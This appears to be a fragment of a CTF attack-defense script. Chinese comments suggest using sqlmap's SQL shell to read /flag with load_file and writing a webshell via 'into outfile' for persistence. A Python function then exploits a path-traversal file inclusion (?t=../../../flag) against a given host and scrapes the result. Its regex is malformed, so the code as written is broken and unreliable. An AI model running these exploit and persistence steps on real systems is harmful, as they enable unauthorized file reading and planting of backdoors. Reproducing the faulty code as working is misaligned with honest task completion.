#手工可以考虑sqlmap,包括使用-sql-shell执行select load_file('/flag');拿flag，使用into outfile写木马维持权限
#下面给出的是python自动化工作

#文件包括漏洞的利用使用../../flag
def include(host):
    r = requests.get(url="http://%s/?t=../../../flag"%host)
    flags = re.findall(r'^).+?)<',r.content)
    if flags:
        return flags[0]
    else:
        return "fail"